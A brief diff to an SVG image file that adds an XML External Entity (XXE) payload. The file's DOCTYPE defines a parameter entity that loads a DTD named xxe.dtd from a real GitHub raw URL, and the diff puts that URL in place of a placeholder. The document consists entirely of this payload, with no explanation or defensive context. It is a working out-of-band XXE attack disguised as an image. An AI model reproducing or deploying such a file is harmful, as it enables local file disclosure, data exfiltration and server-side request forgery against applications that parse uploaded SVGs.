@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY % xxe SYSTEM "https://<raw.github.com>/xxe.dtd">
+  <!ENTITY % xxe SYSTEM "https://raw.githubusercontent.com/Surgat-1/test/refs/heads/main/xxe.dtd">
   %xxe;
 ]>
 <svg xmlns="http://www.w3.org/2000/svg">
